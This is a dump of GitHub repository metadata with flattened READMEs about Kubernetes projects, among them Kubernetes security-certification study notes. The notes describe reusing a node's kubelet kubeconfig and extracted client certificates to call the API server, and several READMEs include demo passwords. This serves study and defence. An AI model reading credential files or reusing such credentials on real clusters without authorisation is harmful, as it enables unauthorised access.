jailton,k8s-4-trutas,,K8S for Trutas Kubernetes images kubernetes horizontal color png Tem Mundial images rintians png Referncias Kubernetes Documentation https kubernetes io docs home Kubernetes Concepts https kubernetes io docs concepts Kubernetes Tutorial https kubernetes io docs tutorials Leituras Recomendas Borg Omega and Kubernetes https queue acm org detail cfm id 2898444 Large scale cluster management at Google with Borg https static googleusercontent com media research google com en pubs archive 43438 pdf Aulas Dia 1 https github com jailton k8s 4 trutas tree master dia 1 Dia 2 https github com jailton k8s 4 trutas tree master dia 2,2020-11-19T23:49:04Z,2020-11-28T19:38:50Z,n/a,User,2,2,1,16,main,jailton,1,0,0,0,0,0,0
desperadochn,k8s-gin-api,,,2020-10-17T17:16:25Z,2020-11-20T08:23:11Z,JavaScript,User,1,2,0,5,master,dcosapp#desperadochn,2,0,0,0,0,0,0
echoboomer,k8s-cks-notes,,k8s cks notes ServiceAccounts You can disable automounting of a ServiceAccount on a ServiceAccount or Pod resource automountServiceAccountToken false mount grep sec to show the mount inside the Pod Mount for token also shows as mounted volume for the Pod Path can be seen there Kubernetes API Three components Authentication Who are you Authorization What are you allowed to do Admission admission controllers Each request to the API is filtered through these Requests are treated as A normal user A ServiceAccount Anonymous access Every request must authenticate unless it s anonymous anonymous auth kubelet flag must be set to false to disable anonymous access etc kubernetes manifests kube apiserver yaml insecure port is set to 0 by default which disables the insecure port Setting this to anything else will also disable Authentication and Authorization Config kubectl config view raw k config set context jane user jane cluster kubernetes k config set credentials jane client key jane key client certificate jane crt embed certs k config use context jane You can use a different config file k kubeconfig or environment variable KUBECONFIG For example on a worker Node there is no kubeconfig available to use with kubectl but kubelet has its own config file that it uses to communicate with the cluster master cat etc kubernetes kubelet conf k kubeconfig etc kubernetes kubelet conf get node Auth k auth can i delete deploment A By extracting the Kubernetes server ca and the user cert and key from kubectl config view raw you can actually makes manual API calls against the Kubernetes API curl https 10 142 0 2 6443 cacert ca cert cert key key Certificates Certificates live at etc kubernetes pki on the server You can also find similar information on clients etc kubernetes pki openssl x509 in apiserver crt text Node Restriction Admission Controller In etc kubernetes manifests kube apiserver yaml yaml enable admission plugins NodeRestriction This sets the NodeRestriction admission controller to enabled This means that requests are subject to it For example this prevents us from labeling the master Node from the worker k label node cks master cks test yes This will fail however we can label our own Node k label node cks worker cks test yes There are restricted labels that we cannot set ourselves node restriction kubernetes io test yes you couldn t set this This would prevent a malicious user from changing a label like this to allow Pods that look for that label to instead run on a compromised Node Updates It s good to update for support security fixes bug fixes and dependencies 1 19 2 major minor patch Minor version every 3 months No Long Term Support Maintenance release branches for the most recent three minor releases for now that s 1 19 1 18 and 1 17 Update Process First master components are upgraded apiserver controller manager scheduler Then worker components are upgraded kubelet kube proxy Components should always have the same minor version as the apiserver kubelet can be two minor versions below apiserver but in general don t do this Stick with same version as apiserver or one below for safety The Process kubectl cordon then kubectl drain Upgrade kubectl uncordon Master bash k drain cks master ignore daemonsets apt cache show kubeadm grep 1 19 apt get install kubeadm 1 19 3 00 kubelet 1 19 3 00 kubectl 1 19 3 00 kubeadm upgrade plan kubeadm upgrade apply v1 19 3 k uncordon cks master Worker bash k drain cks worker ignore daemonsets from master apt cache show kubeadm grep 1 19 apt get install kubeadm 1 19 3 00 kubelet 1 19 3 00 kubectl 1 19 3 00 systemctl restart kubelet k uncordon cks worker from master Application Resiliency As always applications should be able to survive an upgrade Pod termination grace periods PodDisruptionBudgets Pod Lifecycle Events Secrets Usually passwords API keys information needed by an application Container Runtime kubelet args container runtime container runtime endpoint crictl is an open source adaption that is container and Kubernetes native Kata containers adds an additional virtualization layer a bit more like traditional VMs gVisor Google runsc implements a limited use kernel that adds further fine grained separation Runs in user space so it s separated from the Linux kernel RuntimeClasses allow you to specify further runtime environments for objects You use spec runtimeClassName to associate a Pod with a given RuntimeClass Security Contexts yaml spec volumes name vol emptyDir securityContext runAsUser 1000 runAsGroup 3000 fsGroup 2000 containers name foo command sh c sleep 1d image busybox resources securityContext runAsUser 0 Notice how here securityContext is set top level for all Pods but you can override for a specific container Check out API reference from docs if you want to know more about what a flag does Forcing running as non root yaml spec volumes name vol emptyDir securityContext runAsUser 1000 runAsGroup 3000 fsGroup 2000 containers name foo command sh c sleep 1d image busybox resources securityContext runAsNonRoot true This may error if the image runs as root and there is no top level securityContext Error container has runAsNonRoot and image will run as root Privileged Containers yaml spec volumes name vol emptyDir containers name foo command sh c sleep 1d image busybox resources securityContext privileged true Setting privileged true will allow the given Pod to make OS level changes sysctl etc and interact with the kernel This is bad practice Privileged means the container user root 0 is directly mapped to host root 0 Privilege Escalation Privilege Escalation controls whether a process can gain more privileges than its parent process yaml spec volumes name vol emptyDir containers name foo command sh c sleep 1d image busybox resources securityContext allowPrivilegeEscalation true allowPrivilegeEscalation true is the default You can set to false to disable this behavior Pod Security Policies Cluster level resources Controls under which security conditions a Pod has to run Pod Security Policy runs as an admission controller A Pod will only be created if it adheres to these rules It inspects the security contexts Enabling this will deny all Pods from being created in the cluster since out of the box none of the ServiceAccounts have the necessary permissions to look at PodSecurityPolicies As an admin user we can create Pods but they wouldn t create as a result of a Deployment as an example since that creates using the ServiceAccount we talked about before You d have to give the ServiceAccount in this case the default the ability to evaluate PodSecurityPolicies k create role psp access verb use resource podsecuritypolicies k create rolebinding psp access role psp access serviceaccount default default You d want to create the proper RBAC and PodSecurityPolicy resources before enabling this Mutual TLS mTLS Two way bilateral authentication Two parties authenticate to each other to create a secure communication channel By default all Pods can communicate with each other as an implicit function of the chosen CNI Typically TLS is terminated at an Ingress and is unencrypted on the backend in the cluster between Pods etc You could use a sidcar proxy container to handle this encryption overhead Something like Istio works with this model a managed proxy that takes care of certificates You could use an initContainer that creates iptables rules that would force all traffic from your application s Pods through the proxy container All containers in a Pod have access to the same network namespace provided you add the capability as given in the example Open Policy Agent Open source general purpose policy engine You ve used this before It works in Kubernetes too Uses rego in Kubernetes the same way Works with JSON YAML It is not natively Kubernetes aware with its resources for example OPA Gatekeeper creates CRDs to allow Kubernetes to work with OPA yaml apiVersion templates gatekeeper sh v1beta1 kind ConstraintTemplate metadata name k8srequiredlabels yaml apiVersion constraints gatekeeper sh v1beta1 kind K8sRequiredLabels metadata name pod must have foolabel apiVersion constraints gatekeeper sh v1beta1 kind K8sRequiredLabels metadata name pod must have barlabel It creates admission webhooks there are two kinds validating and mutating Mutating webhooks are invoked first and can modify objects After this is done Validating webhooks are invoked and can reject requests to enforce custom policies Use Rego playground to test OPA policies Image Footprints Remember that containers use cgroups which means they have acces sto the host OS kernel It is possible to run containers using the same PID so they share processes Docker images are built using layers Only the instructions RUN COPY and ADD create layers Other instructions create temporary intermediate images and do not increase the size of the build An image size factors in the base image size plus additional layers etc Dockerfile FROM ubuntu ARG DEBIANFRONTEND noninteractive RUN apt get update apt get install y golang go COPY app go RUN CGOENABLED 0 go build app go FROM alpine RUN chmod a w etc RUN addgroup S appgroup adduser S appuser G appgroup h home appuser RUN rm rf bin COPY from 0 app home appuser USER appuser CMD app Using this logic the from 0 here step copies from the first stage stage 0 and stage 1 at the bottom copies the file into the local directory in the resultant final image This essentially gives you a resulting image that only encompasses the final stage reducing its size Hardening An Image Using specific versions in a Dockerfile is more secure instead of using something like latest Don t run as root in a container In the example above we establish a dedicated user and then run as that user by calling USER Making the filesystem read only is also more secure This avoids allowing write access to a given filesystem running as part of a container Using the line RUN chmod a w etc we remove write permissions for the etc directory for all users Removing shell access is also an optimization We do this in the Dockerfile by running RUN rm rf bin this essentially removes the ability to run anything located in that directory This explains why sometimes you cannot exec into a container think top level Kubernetes Pods because that is missing In general running commands together in a layer like apt get update apt get install all in the same operation is better and decreases size Also cleanup install packages in the build Static Analysis Looks at the source code and text files and parses them to check against rules Those rules can then be enforced Examples Always define resource requests and limits Pods should never use the default ServiceAccount Don t store sensitive data in plain text in Dockerfiles or Kubernetes resources Twistlock or Sysdig is an example of this You could do this in an image build phase or after the build phase in a test phase We do this by leveraging the Sysdig inline scanner PodSecurityPolicies and OPA can be used within the cluster for static analysis For example pulling info from a Secret as an environment variable is more secure than hardcoding things Look out for obvious stuff Kubesec is risk analysis for Kubernetes resources It s open source and opinionated It runs using a fixed set of rules based on security best practices It can run as binary a Docker container a kubectl plugin or admission controller Remember that tools like Sysdig also offer an admission controller You can also past a manifest into Kubesec to evaluate it on demand Remember these important features for securityContext readOnlyRootfilesystem true runAsNonRoot true runAsUser gt 10000 capabilities drop OPA offers a tool called conftest that uses the same OPA rego language You can run this in Docker as well You can also use confest against Dockerfiles Image Vulnerability Scanning Containers that contain exploitable packages are a problem This could result in privilege escalation data leaks DDoS etc https cve mitre org https nvd nist gov Tools use these databases to scan images for vulnerabilities We use the Sysdig inline scanner for this You could stop a build or use an Admission Controller to not allow a compromised image version to run in a cluster You could also restrict based on registry hostnames within the cluster using something like OPA or PodSecurityPolicies This would happen either in MutatingAdmission or Validating webhook stages This type of scanning could also take place in a container registry like GCR or ECR Clair Open source vulnerability assessment tool CNCF supported Uses vulnerability databases Trivy Also open source One command to run it docker run ghcr io aquasecurity trivy latest image nginx This will cross reference failures with CVE numbers Supply Chain Security Using a private registry is an example of a secure supply chain component You can create a docker registry Secret in Kubernetes and then associate the imagePullSecrets to the ServiceAccounts for example You can run an image using an image digest instead of a tag since tags can theoretically change and point to different digests You could use OPA via the Admission Controller to limit images to specific repositories Remember that you create a kind of ConstraintTemplate that uses spec crd spec names 0 kind K8sTrustedImages then create a K8sTrustedImages object The admission webhook would then deny creation of a Pod if its spec fails the checks specified by these templates ImagePolicyWebhook creates a kind of ImageReview which can be assessed by an external tool as part of an admission workflow You would add this to enable admission plugins as ImagePolicyWebhook to enable the Admission Controller admission control config file path to admission config yaml You have to adjust Volumes to mount this data in the kube apiserver Pod You must have certificates a kubeconfig etc AdmissionConfiguration kind is where this logic is configured Remember that defaultAllow is set to false by default which means no Pods will create out of the box if this configuration is incomplete Behavioral Analytics Syscall interface is provided by the kernel for example getpid or reboot Applications run in the user space Applications can communicate with the syscall interface or they can use libraries The request is then passed to the kernel and the hardware seccomp and AppArmor lie between the user space and syscall interface for added protection Processes in a container are able to communicate with the kernel given how they run in shared spaces Remember the concept of cgroups strace intercepts and logs system calls made by a process It can also log and display signals received by a process so it s good for debugging etc strace ls This would provide a list of syscalls made to the kernel In the end all commands ran on the command line result in syscalls for how they operate proc directory contains information and connections to processes and kernel Study it to learn how processes work Configuration and administ,2020-11-28T03:26:37Z,2020-12-12T21:32:27Z,n/a,User,1,2,1,2,main,echoboomer,1,0,0,0,0,0,0
felix-dpg,harporias,,harporias K8s controller to generate haproxy configurations dynamically A lot of users has haproxy as the loadbalancer in front of their kubernetes services The configuration of the haproxy when you have a lot of k8s services could be a pain because you need to do it manually That is when harporias could time save generating the configuration of these services dynamically in the haproxy when services are created in the k8s cluster and are NodePort service type What you need to use harporias You need to install de Data Plane API in the haproxy server For more info check this link https www haproxy com documentation hapee 1 9r1 reference dataplaneapi To start using harporias harporias is written in python3 As a k8s controller you need to run it as a Deployment inside your k8s cluster You can use this Dockerfile to build harporias image FROM python latest RUN mkdir app WORKDIR app COPY readservice py app readservice py COPY haproxybackendservertmpl json tmp haproxybackendservertmpl json COPY haproxybackendtmpl json tmp haproxybackendtmpl json COPY haproxyfrontendbindtmpl json tmp haproxyfrontendbindtmpl json COPY haproxyfrontendtmpl json tmp haproxyfrontendtmpl json RUN pip install kubernetes pytz requests CMD python u harporias py or use my image in Dockerhub https hub docker com r felixdpg harporias The json files of the Docker image are templates of the configuration of backend frontend and a bind respectively Feel free to modify it as your needs according to the parameters of the Data Plane API Check this https www haproxy com documentation dataplaneapi latest By default these templates will create the following configuration in the haproxy server backend test mode tcp balance roundrobin option redispatch 0 timeout server 1 timeout connect 10 server server10 10 10 1 10 10 10 1 32084 check weight 100 server server10 10 10 2 10 10 10 2 32084 check weight 100 server server10 10 10 3 10 10 10 3 32084 check weight 100 frontend test mode tcp maxconn 2000 bind 32084 name test defaultbackend test Once you have the image you need a Deployment resource to run harporias You could use this yaml modify it as your needs apiVersion apps v1 kind Deployment metadata name harporias namespace test spec replicas 1 selector matchLabels app harporias template metadata labels app harporias annotations spec serviceAccountName harporias sa containers image 127 0 0 1 5000 harporias imagePullPolicy Always name harporias env name HAPROXYAPIURL value http 127 0 0 1 name HAPROXYPORT value 3000 name HAPROXYAPIUSERNAME value admin name HAPROXYAPIPASSWORD value password name HAPROXYBACKENDS value 10 10 10 1 10 10 10 2 10 10 10 3 There are some env variables in the yaml 1 HAPROXYAPIURL Is the IP address or DNS name of your haproxy server 2 HAPROXYPORT Is the port of your haproxy server 3 HAPROXYAPIUSERNAME Is the username of the Data Plane API 4 HAPROXYAPIPASSWORD Is the password of the Data Plane API 5 HAPROXYBACKENDS Are the IP of your k8s workers nodes where NodePort service are exposed Dont use plain username password in the yaml of the deployment here are for demo purpose its a security risk Please use secrets instead https kubernetes io docs concepts configuration secret using secrets as environment variables In orther to watch the NodePort services created by kubernetes you will need a service account with the appropriate permissions harporias sa apiVersion v1 kind ServiceAccount metadata name harporias sa namespace test labels app kubernetes io name test kind ClusterRole apiVersion rbac authorization k8s io v1 metadata name harporias cr rules apiGroups resources services verbs watch kind ClusterRoleBinding apiVersion rbac authorization k8s io v1 metadata name harporias crb subjects kind ServiceAccount name harporias sa namespace test roleRef kind ClusterRole name harporias cr apiGroup rbac authorization k8s io Its all lets deploy harporias Deploy harporias With all the yamls files in place deploy them with kubectl apply f harporias sa yaml kubectl apply f harporias deployment yaml License MIT License Feel free to fork modify and distribute harporias Support If you need support please open an issue I will reply according to my free time,2020-10-08T10:20:49Z,2020-10-09T08:51:39Z,Python,User,1,2,1,8,main,felixPG#felix-dpg,2,0,1,0,0,0,0
MarshallWace,kind-bootstrap,,kind bootstrap Local Kubernetes bootstrap for coding challenges using kind https kind sigs k8s io It spins up a cluster with 1 master and 2 workers with different containerd and kubelet versions 1 17 nodes Dockerfile 17 1 18 nodes Dockerfile 18 one of the worker nodes has a sensitive filesystem mount worker nodes also support the runsc runtime gVisor https gvisor dev Setup Install Docker https docs docker com get docker kind https github com kubernetes sigs kind releases and run bash git clone https github com MarshallWace kind bootstrap git cd kind bootstrap kind create cluster config cluster yaml name mw Creating cluster mw Ensuring node image ghcr io marshallwace kind node 17 Ensuring node image ghcr io marshallwace kind node 18 Ensuring node image kindest node v1 18 8 Preparing nodes Writing configuration Starting control plane Installing CNI Installing StorageClass Joining worker nodes Set kubectl context to kind mw kubectl get nodes context kind mw NAME STATUS ROLES AGE VERSION mw control plane Ready master 75s v1 18 8 mw worker Ready 41s v1 17 5 mw worker2 Ready 41s v1 18 8 Cleanup bash kind delete cluster name mw,2020-11-13T00:11:14Z,2020-11-19T00:25:04Z,n/a,Organization,2,2,1,6,main,adrianchifor,1,0,0,0,0,0,0
fmdlc,helm-cronjob,chart#cron#cronjob#helm#helm-chart#k8s#kubernetes,helm cronjob template https github com fmdlc helm cronjob actions https github com fmdlc helm cronjob workflows Lint 20Charts badge svg branch master https img shields io github last commit fmdlc helm cronjob https github com fmdlc helm cronjob issues https img shields io github issues raw fmdlc helm cronjob https img shields io github forks fmdlc helm cronjob style plastic https github com fmdlc helm cronjob blob master LICENSE https img shields io github license fmdlc helm cronjob Helm Chart to define and run a Kubernetes scheduled task by defining a cronjob ojbect yaml namespace default image repository alpine pullPolicy IfNotPresent tag 3 7 cron restartPolicy Never concurrencyPolicy Forbid successfulJobsHistoryLimit 2 failedJobsHistoryLimit 3 schedule 10 startingDeadlineSeconds 100 parallelism 1 env name DBNAME value mydb command sleep args 10 resources limits cpu 1 memory 200Mi requests cpu 0 5 memory 100Mi nodeSelector tolerations affinity Usage 1 Edit values yaml file in order to setup your environment 2 First test installation with dry run parameter You can specify the namespace by using n modificator or alter any input parameter with set 3 If definition works as expected remove the dry run from the arguments bash helm install my cronjob dry run NAME my cronjob LAST DEPLOYED Sun Aug 23 18 57 08 2020 NAMESPACE default STATUS pending install REVISION 1 TEST SUITE None HOOKS MANIFEST Source health service templates cronjob yaml apiVersion batch v1beta1 kind CronJob Contributing Pull requests are welcome For major changes please open an issue first to discuss what you would like to change Please make sure to update tests as appropriate Authors Module managed by Facu de la Cruz mailto fmdlc unix gmail com License Apache 2 0 https www apache org licenses LICENSE 2 0,2020-08-23T21:31:47Z,2020-09-05T05:27:41Z,n/a,User,0,2,2,20,master,fmdlc,1,2,2,0,1,0,4
agill17,Terraform-eks-argo,,,2020-10-15T04:33:33Z,2020-11-06T18:58:15Z,HCL,User,1,2,0,0,master,,0,0,0,0,0,0,0
everpcpc,mastodon-helm,,,2020-10-21T07:36:19Z,2020-10-22T04:31:21Z,Smarty,User,1,2,0,7,master,everpcpc,1,0,0,0,0,0,0
CactusSoft,Cactus.Identity.Signing,,Cactus Identity Signing Download https travis ci com CactusSoft Cactus Identity Signing svg branch develop https travis ci com CactusSoft Cactus Identity Signing Download https codecov io gh CactusSoft Cactus Identity Signing graph badge svg https codecov io gh CactusSoft Cactus Identity Signing Library to implement IdentityServer4 https github com IdentityServer IdentityServer4 signing key rollover issued by CertManager https cert manager io docs in k8s infrastructure The workflow is the following CertManager generates Secret that contains current signing key tls crt tls key and PKCS12 keystore that contains CA previously issued certificate keystore p12 Identity service mount the Secret to filesystem So it gets files tls crt tls key and keystore p12 in a folder To start using the keys use extension method services AddCertManagerSigningCredential To get more details about IdentityServer4 keys rollover see the official documentation https docs identityserver io en latest topics crypto html,2020-09-30T13:06:56Z,2020-10-05T09:18:26Z,C#,Organization,3,2,0,10,develop,yan-oreshchenkov,1,0,0,0,0,0,0
chongchuanbing,gpu-monitoring-BasedOn-nvidia-dcgm-exporter,,Document https github com NVIDIA gpu monitoring tools https docs nvidia com datacenter cloud native gpu operator getting started html using grafana prometheus https prometheus io docs prometheus latest querying operators grafana doc https grafana com docs grafana latest Denpendency nvidia docker2 k8s Requirements component version image nvidia dcgm exporter 2 1 1 nvidia dcgm exporter 2 0 13 2 1 2 ubuntu20 04 prometheus v2 3 1 docker io prom prometheus v2 3 1 grafana 7 3 5 grafana grafana 7 3 5 Note The gpu node in k8s must have tag GPU or you can modify the nodeSelector in dcgm exporter yaml depend on yourself grafana account you can modify GFSECURITYADMINPASSWORD GFSECURITYADMINUSER in file grafana yaml admin admin User pv for grafana data you must modify nfs config in file grafana yaml Not for kubeflow please notice grafana yaml you can visit http node address 31111 grafana for kubeflow please notice grafanaforkubeflow yaml and vs yaml you can visit http node address 31380 grafana Grafana Dashboard grafana dashboard GPU Monitor 1608189821413 json or https grafana com grafana dashboards 13579 grafana dashboard NVIDIA DCGM Exporter Dashboard 1608085420122 json or https grafana com grafana dashboards 13580 GPU Monitor image https github com chongchuanbing gpu monitoring BasedOn nvidia dcgm exporter blob main img 1608084229979 jpg NVIDIA DCGM Exporter Dashboard image https github com chongchuanbing gpu monitoring BasedOn nvidia dcgm exporter blob main img 1608085615967 jpg Nvidia dcgm exporter Metircs HELP DCGMFIDEVSMCLOCK SM clock frequency in MHz TYPE DCGMFIDEVSMCLOCK gauge HELP DCGMFIDEVMEMCLOCK Memory clock frequency in MHz TYPE DCGMFIDEVMEMCLOCK gauge HELP DCGMFIDEVMEMORYTEMP Memory temperature in C TYPE DCGMFIDEVMEMORYTEMP gauge HELP DCGMFIDEVGPUTEMP GPU temperature in C TYPE DCGMFIDEVGPUTEMP gauge HELP DCGMFIDEVPOWERUSAGE Power draw in W TYPE DCGMFIDEVPOWERUSAGE gauge HELP DCGMFIDEVTOTALENERGYCONSUMPTION Total energy consumption since boot in mJ TYPE DCGMFIDEVTOTALENERGYCONSUMPTION counter HELP DCGMFIDEVPCIETXTHROUGHPUT Total number of bytes transmitted through PCIe TX in KB via NVML TYPE DCGMFIDEVPCIETXTHROUGHPUT counter HELP DCGMFIDEVPCIERXTHROUGHPUT Total number of bytes received through PCIe RX in KB via NVML TYPE DCGMFIDEVPCIERXTHROUGHPUT counter HELP DCGMFIDEVPCIEREPLAYCOUNTER Total number of PCIe retries TYPE DCGMFIDEVPCIEREPLAYCOUNTER counter HELP DCGMFIDEVGPUUTIL GPU utilization in TYPE DCGMFIDEVGPUUTIL gauge HELP DCGMFIDEVMEMCOPYUTIL Memory utilization in TYPE DCGMFIDEVMEMCOPYUTIL gauge HELP DCGMFIDEVENCUTIL Encoder utilization in TYPE DCGMFIDEVENCUTIL gauge HELP DCGMFIDEVDECUTIL Decoder utilization in TYPE DCGMFIDEVDECUTIL gauge HELP DCGMFIDEVXIDERRORS Value of the last XID error encountered TYPE DCGMFIDEVXIDERRORS gauge HELP DCGMFIDEVPOWERVIOLATION Throttling duration due to power constraints in us TYPE DCGMFIDEVPOWERVIOLATION counter HELP DCGMFIDEVTHERMALVIOLATION Throttling duration due to thermal constraints in us TYPE DCGMFIDEVTHERMALVIOLATION counter HELP DCGMFIDEVSYNCBOOSTVIOLATION Throttling duration due to sync boost constraints in us TYPE DCGMFIDEVSYNCBOOSTVIOLATION counter HELP DCGMFIDEVBOARDLIMITVIOLATION Throttling duration due to board limit constraints in us TYPE DCGMFIDEVBOARDLIMITVIOLATION counter HELP DCGMFIDEVLOWUTILVIOLATION Throttling duration due to low utilization in us TYPE DCGMFIDEVLOWUTILVIOLATION counter HELP DCGMFIDEVRELIABILITYVIOLATION Throttling duration due to reliability constraints in us TYPE DCGMFIDEVRELIABILITYVIOLATION counter HELP DCGMFIDEVFBFREE Framebuffer memory free in MiB TYPE DCGMFIDEVFBFREE gauge HELP DCGMFIDEVFBUSED Framebuffer memory used in MiB TYPE DCGMFIDEVFBUSED gauge HELP DCGMFIDEVECCSBEVOLTOTAL Total number of single bit volatile ECC errors TYPE DCGMFIDEVECCSBEVOLTOTAL counter HELP DCGMFIDEVECCDBEVOLTOTAL Total number of double bit volatile ECC errors TYPE DCGMFIDEVECCDBEVOLTOTAL counter HELP DCGMFIDEVECCSBEAGGTOTAL Total number of single bit persistent ECC errors TYPE DCGMFIDEVECCSBEAGGTOTAL counter HELP DCGMFIDEVECCDBEAGGTOTAL Total number of double bit persistent ECC errors TYPE DCGMFIDEVECCDBEAGGTOTAL counter HELP DCGMFIDEVRETIREDSBE Total number of retired pages due to single bit errors TYPE DCGMFIDEVRETIREDSBE counter HELP DCGMFIDEVRETIREDDBE Total number of retired pages due to double bit errors TYPE DCGMFIDEVRETIREDDBE counter HELP DCGMFIDEVRETIREDPENDING Total number of pages pending retirement TYPE DCGMFIDEVRETIREDPENDING counter HELP DCGMFIDEVNVLINKCRCFLITERRORCOUNTTOTAL Total number of NVLink flow control CRC errors TYPE DCGMFIDEVNVLINKCRCFLITERRORCOUNTTOTAL counter HELP DCGMFIDEVNVLINKCRCDATAERRORCOUNTTOTAL Total number of NVLink data CRC errors TYPE DCGMFIDEVNVLINKCRCDATAERRORCOUNTTOTAL counter HELP DCGMFIDEVNVLINKREPLAYERRORCOUNTTOTAL Total number of NVLink retries TYPE DCGMFIDEVNVLINKREPLAYERRORCOUNTTOTAL counter HELP DCGMFIDEVNVLINKRECOVERYERRORCOUNTTOTAL Total number of NVLink recovery errors TYPE DCGMFIDEVNVLINKRECOVERYERRORCOUNTTOTAL counter HELP DCGMFIDEVNVLINKBANDWIDTHTOTAL Total number of NVLink bandwidth counters for all lanes TYPE DCGMFIDEVNVLINKBANDWIDTHTOTAL counter,2020-12-16T01:27:00Z,2020-12-22T03:39:52Z,n/a,User,1,2,0,1,main,chongchuanbing,1,0,0,0,0,0,0
jjasghar,ibmcloud-k8s-the-hardway,ibmcloud#kubernetes,IBM Cloud k8s The Hard Way Scope Hi wave Thanks for stopping by Maybe you knew what this is before coming by or maybe you stumbled onto it Either way let me take a couple moments to explain what this project is Recently I was talking with my brother and he mentioned that he was thinking of trying out good ol Linux from Scratch lfs I mentioned that its one hellva endeavor and more people are doing Kelsey Hightowers Kubernetes The Hard Way k8s He asked if I had and realized I hadnt and he mentioned I should stream it I sent a tweet out not 10 mins later this happened img kelseys tweet png Needless to say I spun this project up Below should be the YouTube replays of me walking though his project If you came here while Im still doing this live over September and October of 2020 you should see the next scheduled stream below and on the IBM Developer Channel twitch I ll be collecting my notes and anything else I discover in this repository I hope this will help someone in the future Calendar Time 1400 CDT 1900 UTC Date Video Notes Sept 17th TBD Sept 24th Oct 1st License and Author s Author JJ Asghar If you would like to see a more detailed licence click here LICENSE text Copyright 2020 IBM Inc Licensed under the Apache License Version 2 0 the License you may not use this file except in compliance with the License You may obtain a copy of the License at http www apache org licenses LICENSE 2 0 Unless required by applicable law or agreed to in writing software distributed under the License is distributed on an AS IS BASIS WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied See the License for the specific language governing permissions and limitations under the License k8s https github com kelseyhightower kubernetes the hard way lfs http www linuxfromscratch org lfs twitch https twitch tv ibmdeveloper,2020-09-08T21:03:23Z,2020-09-24T20:52:45Z,n/a,User,2,2,0,4,master,jjasghar,1,0,0,0,0,0,0
chrisleekr,k8s-nodejs-vuejs-mysql-boilerplate,helm#infrastructure-as-code#kubernetes#microservice#minikube#mysql-cluster#terraform,Kubernetes sample project for Node js REST API Vue js Frontend Backend MySQL Boilerplate This project demonstrates simple IaC Infrastructure as Code for NVM boilerplate https github com chrisleekr nodejs vuejs mysql boilerplate to Minikube This is a Kubernetes sample project not for a production use Prerequisites Minikube v1 15 1 https kubernetes io docs tasks tools install minikube Kubernetes v 1 19 4 https kubernetes io docs tasks tools install kubectl Helm v3 4 1 https helm sh docs intro install Terraform v0 13 5 https learn hashicorp com tutorials terraform install cli How to test in your Minikube 1 Start minikube bash minikube start minikube addons enable ingress minikube addons enable metrics server 2 Go to terraform folder 3 Run Terraform commands bash terraform init terraform plan terraform apply or simply run bash script bash script deploy sh 4 Update hosts file bash script update hosts sh With this project you can find Sample Terraform Sample Helm charts to deploy multiple containerised micro services Micro services Repository Node js Vue js MySQL Boilerplate https github com chrisleekr nodejs vuejs mysql boilerplate https github com chrisleekr nodejs vuejs mysql boilerplate Presslabs MySQL Operator To see orchestrator run following port forward bash kubectl nnvm db port forward service presslabs mysql operator 8080 80 image https user images githubusercontent com 5715919 100513791 ed9ff900 31c3 11eb 80c6 7a3d332d272d png And open http localhost 8080 http localhost 8080 To see operator logs run following command bash kubectl nnvm db logs presslabs mysql operator 0 c operator f To access mysql run following command bash kubectl nnvm db port forward mysql cluster mysql 0 3307 3306 mysql h127 0 0 1 uroot proot P3307 boilerplate Horizontal Pod Autoscaler bash kubectl get hpa all namespaces If you see 50 make sure you enabled metrics server bash minikube addons enable metrics server Prometheus Grafana You can access Grafana via http nvm boilerplate local grafana Once the deployment is completed then you will see the result like below text Apply complete Resources 0 added 1 changed 0 destroyed Outputs grafanaadminpassword ynSVNykpU72RM5x6 For example as above if admin password ynSVNykpU72RM5x6 then you can login Grafana with admin ynSVNykpU72RM5x6 image https user images githubusercontent com 5715919 100513860 4a031880 31c4 11eb 8ef2 04202055aa78 png Todo x Update MySQL with a replicated stateful application Use presslabs mysql operator x Add HorizontalPodAutoscaler x Add Prometheus and Grafana x Expose MySQL write node for migration to avoid api migration failure,2020-10-10T06:04:09Z,2020-12-28T08:27:55Z,HCL,User,1,2,0,4,master,chrisleekr,1,0,0,0,0,0,3
vamsi1967,azurepipelines-deploy-to-onperm-k8s,,azurepipelines deploy to onperm k8s Creating CI CD pipeline to deploy docker image to on perm kubernetes cluster,2020-11-03T20:28:17Z,2020-11-09T21:40:57Z,HTML,User,2,2,1,9,main,vamsi1967,1,0,0,0,0,0,0
cdbkr,terraform-typescript-k8s-example,,,2020-11-03T10:28:03Z,2020-11-13T06:47:58Z,TypeScript,User,1,2,1,1,master,cdbkr,1,0,0,0,0,0,0
mcclanc,CodeStream-K8s-Blog,,CodeStream K8s Blog The scripts and Pipeline source for the vSphere vRA Tanzu Blog This content is assocaited to the blog post located at http blogs vmware com management 2020 08 v7 vra tanzu html In detail this blog will setup a vRealize Automation Cloud Code Stream pipeline that will create a Supervisor Namespace with an associated storage policy deploy a Tanzu Kubernetes cluster in the namespace and automatically set it up in Code Stream as an endpoint for use by other pipelines All of this will then be added to Service Broker as a self service catalog item with an approval policy attached,2020-08-17T16:16:48Z,2020-08-25T23:25:30Z,Dockerfile,User,2,2,0,13,master,mcclanc,1,0,0,0,0,0,0
nils-braun,dask-sql-k8s-deployment,,dask sql k8s example deployment This repository contains some example code to deploy dask sql a Dask cluster and Apache Hue as BI tool on a k8s cluster Requirements You need to have a k8s cluster You can either run a development k8s cluster locally e g via kind https kind sigs k8s io docs user quick start or minikube https minikube sigs k8s io docs start or deploy a cluster on one of the public cloud providers After that make sure you have kubectl and helm installed and you can access your cluster Deployment First make sure the file dask sql values yaml contains the correct number of workers you want to have and add additional conda packages to install Then call helm dependency update dask sql helm upgrade cleanup on fail install dask sql dask sql After the deployment has finished do a port forwarding kubectl port forward svc hue 8888 8888 and access http localhost 8888 You should be able to see the nyc taxi table in the schema called schema in the presto tab Please note that the first access to the server triggers some initialization which might take a couple of seconds Now you can query the data For example try the following query sql SELECT FLOOR tripdistance 5 5 AS distance AVG tipamount AS given tip AVG predictprice totalamount tripdistance passengercount AS predicted tip FROM nyc taxi WHERE tripdistance 0 AND tripdistance 50 GROUP BY FLOOR tripdistance 5 5 How does it work The helm chart installs three components Dask cluster The basis for dask sql is a Dask cluster Dask already comes with a nice helm chart which has many configuration parameters We use it via a dependency and just change the number of workers and the installed packages Apache Hue For accessing the SQL server we use the Apache Hue BI tool It consists of the webservice and a MySQL database for the settings which are deployed using the manifest files in dask sql templates hue dask sql Finally we can start the dask sql container with a custom startup file which looks like this python import tempfile import requests from dask distributed import Client wait import dask dataframe as dd import xgboost import numpy as np import daskxgboost if name main Create a dask client client Client dask sql scheduler 8786 print Dashboard client dashboardlink Load model and register predict function bst xgboost core Booster with tempfile 